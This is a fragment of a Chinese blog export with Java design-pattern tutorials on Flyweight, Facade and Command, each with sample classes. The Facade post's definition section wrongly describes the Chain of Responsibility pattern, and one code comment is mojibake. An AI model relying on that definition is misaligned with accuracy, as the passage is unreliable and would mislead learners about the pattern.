<h3 id="BigChar"><a href="#BigChar" class="headerlink" title="BigChar"></a>BigChar</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BigChar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> charname;</span><br><span class="line">    <span class="keyword">private</span> String fontdata;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BigChar</span><span class="params">(<span class="keyword">char</span> charname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.charname = charname;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader reader = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                <span class="keyword">new</span> FileReader(<span class="string">"big"</span> + charname + <span class="string">".txt"</span>)</span><br><span class="line">            );</span><br><span class="line">            String line;</span><br><span class="line">            StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                buf.append(line);</span><br><span class="line">                buf.append(<span class="string">"\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">            <span class="keyword">this</span>.fontdata = buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">this</span>.fontdata = charname + <span class="string">"?"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.print(fontdata);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BigCharFactory"><a href="#BigCharFactory" class="headerlink" title="BigCharFactory"></a>BigCharFactory</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BigCharFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap pool = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> BigCharFactory singleton = <span class="keyword">new</span> BigCharFactory();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BigCharFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BigCharFactory <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> BigChar <span class="title">getBigChar</span><span class="params">(<span class="keyword">char</span> charname)</span> </span>&#123;</span><br><span class="line">        BigChar bc = (BigChar)pool.get(<span class="string">""</span> + charname);</span><br><span class="line">        <span class="keyword">if</span> (bc == <span class="keyword">null</span>) &#123;</span><br><span class="line">            bc = <span class="keyword">new</span> BigChar(charname); </span><br><span class="line">            pool.put(<span class="string">""</span> + charname, bc);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BigString"><a href="#BigString" class="headerlink" title="BigString"></a>BigString</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BigString</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BigChar[] bigchars;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BigString</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">        bigchars = <span class="keyword">new</span> BigChar[string.length()];</span><br><span class="line">        BigCharFactory factory = BigCharFactory.getInstance();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bigchars.length; i++) &#123;</span><br><span class="line">            bigchars[i] = factory.getBigChar(string.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bigchars.length; i++) &#123;</span><br><span class="line">            bigchars[i].print();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java Main digits"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Example: java Main 1212123"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BigString bs = <span class="keyword">new</span> BigString(args[<span class="number">0</span>]);</span><br><span class="line">        bs.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="big-txt"><a href="#big-txt" class="headerlink" title="big-.txt"></a>big-.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">................</span><br><span class="line">................</span><br><span class="line">................</span><br><span class="line">................</span><br><span class="line">..##########....</span><br><span class="line">................</span><br><span class="line">................</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big0-txt"><a href="#big0-txt" class="headerlink" title="big0.txt"></a>big0.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big1-txt"><a href="#big1-txt" class="headerlink" title="big1.txt"></a>big1.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">......##........</span><br><span class="line">..######........</span><br><span class="line">......##........</span><br><span class="line">......##........</span><br><span class="line">......##........</span><br><span class="line">......##........</span><br><span class="line">..##########....</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big2-txt"><a href="#big2-txt" class="headerlink" title="big2.txt"></a>big2.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..........##....</span><br><span class="line">......####......</span><br><span class="line">....##..........</span><br><span class="line">..##............</span><br><span class="line">..##########....</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big3-txt"><a href="#big3-txt" class="headerlink" title="big3.txt"></a>big3.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..........##....</span><br><span class="line">......####......</span><br><span class="line">..........##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big4-txt"><a href="#big4-txt" class="headerlink" title="big4.txt"></a>big4.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">........##......</span><br><span class="line">......####......</span><br><span class="line">....##..##......</span><br><span class="line">..##....##......</span><br><span class="line">..##########....</span><br><span class="line">........##......</span><br><span class="line">......######....</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big5-txt"><a href="#big5-txt" class="headerlink" title="big5.txt"></a>big5.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..##########....</span><br><span class="line">..##............</span><br><span class="line">..##............</span><br><span class="line">..########......</span><br><span class="line">..........##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big6-txt"><a href="#big6-txt" class="headerlink" title="big6.txt"></a>big6.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..##............</span><br><span class="line">..########......</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big7-txt"><a href="#big7-txt" class="headerlink" title="big7.txt"></a>big7.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..##########....</span><br><span class="line">..##......##....</span><br><span class="line">..........##....</span><br><span class="line">........##......</span><br><span class="line">......##........</span><br><span class="line">......##........</span><br><span class="line">......##........</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big8-txt"><a href="#big8-txt" class="headerlink" title="big8.txt"></a>big8.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">................</span><br></pre></td></tr></table></figure>

<h3 id="big9-txt"><a href="#big9-txt" class="headerlink" title="big9.txt"></a>big9.txt</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....######......</span><br><span class="line">..##......##....</span><br><span class="line">..##......##....</span><br><span class="line">....########....</span><br><span class="line">..........##....</span><br><span class="line">..##......##....</span><br><span class="line">....######......</span><br><span class="line">................</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>享元模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-外观模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。</p>
<p>在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-facade1.png" alt="外观模式类图"></p>
<h3 id="Facade"><a href="#Facade" class="headerlink" title="Facade"></a>Facade</h3><p>代表构成系统的许多其他角色的“简单窗口”。Facade向系统外部提供高层接口</p>
<h3 id="构成系统的许多其他角色"><a href="#构成系统的许多其他角色" class="headerlink" title="构成系统的许多其他角色"></a>构成系统的许多其他角色</h3><p>这些角色各自完成自己的工作，它们并不知道Facade角色。Facade角色调用其他角色进行工作，但是其他角色不会调用Facade角色。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-facade2.png" alt="外观模式示例类图"></p>
<h3 id="PageMaker"><a href="#PageMaker" class="headerlink" title="PageMaker"></a>PageMaker</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageMaker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">PageMaker</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeWelcomePage</span><span class="params">(String mailaddr, String filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Properties mailprop = Database.getProperties(<span class="string">"maildata"</span>);</span><br><span class="line">            String username = mailprop.getProperty(mailaddr);</span><br><span class="line">            HtmlWriter writer = <span class="keyword">new</span> HtmlWriter(<span class="keyword">new</span> FileWriter(filename));</span><br><span class="line">            writer.title(<span class="string">"Welcome to "</span> + username + <span class="string">"'s page!"</span>);</span><br><span class="line">            writer.paragraph(<span class="string">"123"</span> + username + <span class="string">"456"</span>);</span><br><span class="line">            writer.paragraph(<span class="string">"789"</span>);</span><br><span class="line">            writer.mailto(mailaddr, username);</span><br><span class="line">            writer.close();</span><br><span class="line">            System.out.println(filename + <span class="string">" is created for "</span> + mailaddr + <span class="string">" ("</span> + username + <span class="string">")"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HtmlWriter"><a href="#HtmlWriter" class="headerlink" title="HtmlWriter"></a>HtmlWriter</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HtmlWriter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Writer writer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HtmlWriter</span><span class="params">(Writer writer)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">this</span>.writer = writer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">title</span><span class="params">(String title)</span> <span class="keyword">throws</span> IOException </span>&#123;    </span><br><span class="line">        writer.write(<span class="string">"&lt;html&gt;"</span>);</span><br><span class="line">        writer.write(<span class="string">"&lt;head&gt;"</span>);</span><br><span class="line">        writer.write(<span class="string">"&lt;title&gt;"</span> + title + <span class="string">"&lt;/title&gt;"</span>);</span><br><span class="line">        writer.write(<span class="string">"&lt;/head&gt;"</span>);</span><br><span class="line">        writer.write(<span class="string">"&lt;body&gt;\n"</span>);</span><br><span class="line">        writer.write(<span class="string">"&lt;h1&gt;"</span> + title + <span class="string">"&lt;/h1&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paragraph</span><span class="params">(String msg)</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">        writer.write(<span class="string">"&lt;p&gt;"</span> + msg + <span class="string">"&lt;/p&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">link</span><span class="params">(String href, String caption)</span> <span class="keyword">throws</span> IOException </span>&#123;  </span><br><span class="line">        paragraph(<span class="string">"&lt;a href=\""</span> + href + <span class="string">"\"&gt;"</span> + caption + <span class="string">"&lt;/a&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mailto</span><span class="params">(String mailaddr, String username)</span> <span class="keyword">throws</span> IOException </span>&#123;   </span><br><span class="line">        link(<span class="string">"mailto:"</span> + mailaddr, username);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;    </span><br><span class="line">        writer.write(<span class="string">"&lt;/body&gt;"</span>);</span><br><span class="line">        writer.write(<span class="string">"&lt;/html&gt;\n"</span>);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Database</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Properties <span class="title">getProperties</span><span class="params">(String dbname)</span> </span>&#123; </span><br><span class="line">        String filename = dbname + <span class="string">".txt"</span>;</span><br><span class="line">        Properties prop = <span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            prop.load(<span class="keyword">new</span> FileInputStream(filename));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Warning: "</span> + filename + <span class="string">" is not found."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prop;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        PageMaker.makeWelcomePage(<span class="string">"hyuki@hyuki.com"</span>, <span class="string">"welcome.html"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Facade模式可以让复杂的东西看起来简单。这里说的“复杂的东西”指的是在后台工作的这些类之间的关系和它们的使用方法。使用Facade模式可以让我们不必在意这些复杂的东西。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>外观模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-命令模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>命令模式（Command Pattern）是一种数据驱动的设计模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-command1.png" alt="命令模式类图"></p>
<h3 id="Command（命令）"><a href="#Command（命令）" class="headerlink" title="Command（命令）"></a>Command（命令）</h3><p>负责定义命令的接口</p>
<h3 id="ConcreteCommand（具体的命令）"><a href="#ConcreteCommand（具体的命令）" class="headerlink" title="ConcreteCommand（具体的命令）"></a>ConcreteCommand（具体的命令）</h3><p>负责实现在Command中定义的接口。</p>
<h3 id="Receiver（接收者）"><a href="#Receiver（接收者）" class="headerlink" title="Receiver（接收者）"></a>Receiver（接收者）</h3><p>是Command执行命令时的对象，也可以称之为命令接收者。</p>
<h3 id="Client（请求者）"><a href="#Client（请求者）" class="headerlink" title="Client（请求者）"></a>Client（请求者）</h3><p>负责生成ConcreteCommand并分配Receiver。</p>
<h3 id="Invoke（发动者）"><a href="#Invoke（发动者）" class="headerlink" title="Invoke（发动者）"></a>Invoke（发动者）</h3><p>是开始执行命令的角色，它会调用在Command中定义的接口。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-command2.png" alt="命令模式示例类图"></p>
<h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MacroCommand"><a href="#MacroCommand" class="headerlink" title="MacroCommand"></a>MacroCommand</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MacroCommand</span> <span class="keyword">implements</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Stack commands = <span class="keyword">new</span> Stack();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Iterator it = commands.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            ((Command)it.next()).execute();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">append</span><span class="params">(Command cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="keyword">this</span>) &#123;</span><br><span class="line">            commands.push(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">undo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!commands.empty()) &#123;</span><br><span class="line">            commands.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        commands.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Drawable"><a href="#Drawable" class="headerlink" title="Drawable"></a>Drawable</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public interface Drawable &#123;</span><br><span class="line">    public abstract void draw(int x, int y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DrawCanvas"><a href="#DrawCanvas" class="headerlink" title="DrawCanvas"></a>DrawCanvas</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DrawCanvas</span> <span class="keyword">extends</span> <span class="title">Canvas</span> <span class="keyword">implements</span> <span class="title">Drawable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Color color = Color.red;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> radius = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">private</span> MacroCommand history;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DrawCanvas</span><span class="params">(<span class="keyword">int</span> width, <span class="keyword">int</span> height, MacroCommand history)</span> </span>&#123;</span><br><span class="line">        setSize(width, height);</span><br><span class="line">        setBackground(Color.white);</span><br><span class="line">        <span class="keyword">this</span>.history = history;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">        history.execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 缁樺埗</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        Graphics g = getGraphics();</span><br><span class="line">        g.setColor(color);</span><br><span class="line">        g.fillOval(x - radius, y - radius, radius * <span class="number">2</span>, radius * <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DrawCommand"><a href="#DrawCommand" class="headerlink" title="DrawCommand"></a>DrawCommand</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DrawCommand</span> <span class="keyword">implements</span> <span class="title">Command</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Drawable drawable;</span><br><span class="line">    <span class="keyword">private</span> Point position;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DrawCommand</span><span class="params">(Drawable drawable, Point position)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.drawable = drawable;</span><br><span class="line">        <span class="keyword">this</span>.position = position;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        drawable.draw(position.x, position.y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">ActionListener</span>, <span class="title">MouseMotionListener</span>, <span class="title">WindowListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MacroCommand history = <span class="keyword">new</span> MacroCommand();</span><br><span class="line">    <span class="keyword">private</span> DrawCanvas canvas = <span class="keyword">new</span> DrawCanvas(<span class="number">400</span>, <span class="number">400</span>, history);</span><br><span class="line">    <span class="keyword">private</span> JButton clearButton  = <span class="keyword">new</span> JButton(<span class="string">"clear"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Main</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(title);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.addWindowListener(<span class="keyword">this</span>);</span><br><span class="line">        canvas.addMouseMotionListener(<span class="keyword">this</span>);</span><br><span class="line">        clearButton.addActionListener(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">        Box buttonBox = <span class="keyword">new</span> Box(BoxLayout.X_AXIS);</span><br><span class="line">        buttonBox.add(clearButton);</span><br><span class="line">        Box mainBox = <span class="keyword">new</span> Box(BoxLayout.Y_AXIS);</span><br><span class="line">        mainBox.add(buttonBox);</span><br><span class="line">        mainBox.add(canvas);</span><br><span class="line">        getContentPane().add(mainBox);</span><br><span class="line"></span><br><span class="line">        pack();</span><br><span class="line">        show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (e.getSource() == clearButton) &#123;</span><br><span class="line">            history.clear();</span><br><span class="line">            canvas.repaint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseMoved</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseDragged</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">        Command cmd = <span class="keyword">new</span> DrawCommand(canvas, e.getPoint());</span><br><span class="line">        history.append(cmd);</span><br><span class="line">        cmd.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosing</span><span class="params">(WindowEvent e)</span> </span>&#123;</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowActivated</span><span class="params">(WindowEvent e)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosed</span><span class="params">(WindowEvent e)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowDeactivated</span><span class="params">(WindowEvent e)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowDeiconified</span><span class="params">(WindowEvent e)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowIconified</span><span class="params">(WindowEvent e)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowOpened</span><span class="params">(WindowEvent e)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Main(<span class="string">"Command Pattern Sample"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>命令模式</tag>
      </tags>
